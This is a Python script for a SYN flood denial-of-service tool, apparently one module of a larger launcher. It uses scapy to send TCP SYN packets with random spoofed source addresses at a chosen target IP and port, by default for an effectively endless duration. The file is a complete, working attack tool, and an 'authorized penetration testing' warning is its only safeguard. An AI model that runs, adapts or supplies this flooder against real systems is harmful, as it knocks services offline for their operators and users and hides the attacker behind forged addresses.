
import sys
import argparse
from scapy.all import IP, TCP, send, RandIP, RandShort
from rich.console import Console
from rich.prompt import Prompt

console = Console()

def get_args():
    """Return argument information for the launcher"""
    return [
        {"flag": "192.168.X.X", "desc": "Target IP address (positional)"},
        {"flag": "-p, --port", "desc": "Target port (default: 80)"},
        {"flag": "-d, --duration", "desc": "Attack duration in seconds (default: continuous)"},
    ]

def main():
    parser = argparse.ArgumentParser(
        description='SYN Flood Attack - DoS simulation tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Example: sf.py 192.168.1.100 -p 443 -d 60"
    )
    parser.add_argument('target', nargs='?', help='Target IP address')
    parser.add_argument('-p', '--port', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('-d', '--duration', type=int, default=1000000000000000, help='Attack duration in seconds (default: continuous)')
    
    args = parser.parse_args()
    
    # If no target provided via args, prompt for it
    target = args.target
    if not target:
        target = Prompt.ask("[cyan]Enter target IP address")
    
    port = args.port
    duration = args.duration
    
    console.print("[red bold]WARNING: Only use this tool for authorized penetration testing![/red bold]")
    console.print(f"[cyan]Target: {target}:{port}[/cyan]")
    console.print(f"[cyan]Duration: {duration} seconds[/cyan]")
    console.print("[yellow]Starting SYN Flood Attack...[/yellow]\n")
    
    # Execute attack
    import time
    start = time.time()
    packet_count = 0
    
    try:
        while time.time() - start < duration:
            pkt = IP(dst=target, src=RandIP()) / TCP(sport=RandShort(), dport=port, flags="S")
            send(pkt, verbose=0)
            packet_count += 1
            if packet_count % 100 == 0:
                console.print(f"[green]Sent {packet_count} packets[/green]")
    except KeyboardInterrupt:
        console.print("\n[yellow]Attack interrupted[/yellow]")
    finally:
        console.print(f"[green]Attack complete! Sent {packet_count} packets[/green]")

if __name__ == '__main__':
    main()
